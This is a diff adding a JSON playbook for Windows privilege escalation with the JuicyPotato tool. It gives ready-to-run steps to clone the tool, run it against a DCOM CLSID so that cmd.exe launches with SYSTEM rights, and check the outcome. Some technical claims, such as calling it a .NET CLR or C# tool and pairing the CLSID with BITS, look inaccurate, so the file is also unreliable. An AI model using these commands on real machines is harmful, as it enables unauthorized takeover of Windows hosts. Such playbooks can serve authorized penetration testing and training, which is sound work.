@@ -1,0 +1,31 @@
+{
+    "name": "Windows Privilege Escalation with Juicy Potato",
+    "description": "Advanced DCOM/RPC exploitation using CLR and token manipulation to bypass integrity checks for reliable SYSTEM access.",
+    "tools": [
+        {
+            "name": "JuicyPotato",
+            "description": "Improved potato variant leveraging .NET CLR for more stable DCOM activation and impersonation",
+            "url": "https://github.com/ohpe/juicy-potato"
+        }
+    ],
+    "steps": [
+        {
+            "index": 1,
+            "name": "Download JuicyPotato",
+            "command": "git clone https://github.com/ohpe/juicy-potato.git; cd juicy-potato; Build or use precompiled JuicyPotato.exe",
+            "description": "Clone the repo, compile the C# project if needed, and copy the executable to the target system."
+        },
+        {
+            "index": 2,
+            "name": "Execute JuicyPotato",
+            "command": "./JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c whoami > C:\\temp\\whoami.txt\" -t * -c {F9E380B5-8F40-11CE-8794-00A024A23D8A}",
+            "description": "Run with local port, payload arguments, all transports (-t *), and a vulnerable CLSID for DCOM (e.g., BITS)."
+        },
+        {
+            "index": 3,
+            "name": "Validate Privileges",
+            "command": "type C:\\temp\\whoami.txt; Check process integrity with icacls or whoami /groups",
+            "description": "Review output file for SYSTEM indication; exploit further if escalation to high integrity is confirmed."
+        }
+    ]
+}
